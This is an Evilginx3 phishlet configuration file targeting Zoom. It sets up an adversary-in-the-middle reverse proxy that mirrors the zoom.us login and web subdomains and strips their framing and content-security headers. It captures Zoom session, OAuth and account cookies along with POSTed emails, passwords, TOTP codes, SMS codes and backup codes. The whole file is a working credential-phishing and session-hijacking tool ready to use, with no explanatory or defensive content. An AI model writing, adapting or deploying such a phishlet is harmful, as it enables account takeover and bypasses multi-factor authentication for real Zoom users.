min_ver: '3.0.0'
author: 'evilginx3'
redirect_url: 'https://zoom.us/'

proxy_hosts:
  - {phish_sub: 'us04web', orig_sub: 'us04web', domain: 'zoom.us', session: true, is_landing: true, auto_filter: true}
  - {phish_sub: 'us02web', orig_sub: 'us02web', domain: 'zoom.us', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'login', orig_sub: 'login', domain: 'zoom.us', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'api', orig_sub: 'api', domain: 'zoom.us', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'zoom.us', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'cdn', orig_sub: 'cdn', domain: 'zoom.us', session: false, is_landing: false, auto_filter: true}

sub_filters:
  # Replace Zoom domain URLs
  - {triggers_on: 'us04web.zoom.us', orig_sub: 'us04web', domain: 'zoom.us', search: 'https://us04web\\.zoom\\.us', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'us04web.zoom.us', orig_sub: 'us02web', domain: 'zoom.us', search: 'https://us02web\\.zoom\\.us', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'us04web.zoom.us', orig_sub: 'login', domain: 'zoom.us', search: 'https://login\\.zoom\\.us', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'us04web.zoom.us', orig_sub: 'api', domain: 'zoom.us', search: 'https://api\\.zoom\\.us', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'us04web.zoom.us', orig_sub: 'www', domain: 'zoom.us', search: 'https://www\\.zoom\\.us', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'us04web.zoom.us', orig_sub: 'cdn', domain: 'zoom.us', search: 'https://[a-z0-9-]+\\.zoom\\.us', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/javascript']}
  
  # Remove security headers
  - {triggers_on: 'us04web.zoom.us', orig_sub: 'us04web', domain: 'zoom.us', search: 'X-Frame-Options:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'us04web.zoom.us', orig_sub: 'us04web', domain: 'zoom.us', search: 'Content-Security-Policy:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'us04web.zoom.us', orig_sub: 'login', domain: 'zoom.us', search: 'X-Frame-Options:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'us04web.zoom.us', orig_sub: 'login', domain: 'zoom.us', search: 'Content-Security-Policy:.*', replace: '', mimes: ['text/html']}

auth_tokens:
  # Primary Zoom authentication cookies
  - domain: '.zoom.us'
    keys: ['zm_aid', 'zm_aaid', 'zm_ssid', 'zm_ccid', 'zm_lang', 'zm_tmaid', 'zm_htmaid']
    type: 'cookie'
  
  # Session and security cookies
  - domain: '.zoom.us'
    keys: ['zm_cid', 'zm_csid', 'zm_cap', 'zm_cap_ts', 'zm_cap_ts_ss']
    type: 'cookie'
    optional: true
  
  # OAuth tokens
  - domain: '.zoom.us'
    keys: ['zm_oauth_token', 'zm_oauth_refresh_token', 'zm_access_token']
    type: 'cookie'
    optional: true
  
  # User and account cookies
  - domain: '.zoom.us'
    keys: ['zm_user_id', 'zm_account_id', 'zm_account_type']
    type: 'cookie'
    optional: true

credentials:
  username:
    key: 'email'
    search: '(.*)'
    type: 'post'
  
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
  
  # Alternative email field
  email:
    key: 'username'
    search: '(.*)'
    type: 'post'
  
  # 2FA codes
  totp_code:
    key: 'totp_code'
    search: '(.*)'
    type: 'post'
  
  # SMS codes
  sms_code:
    key: 'sms_code'
    search: '(.*)'
    type: 'post'
  
  # Backup codes
  backup_code:
    key: 'backup_code'
    search: '(.*)'
    type: 'post'

auth_urls:
  - '^/profile'
  - '^/account'
  - '^/meeting'
  - '^/webinar'
  - '^/settings'
  - '^/dashboard'

login:
  domain: 'us04web.zoom.us'
  path: '/signin'

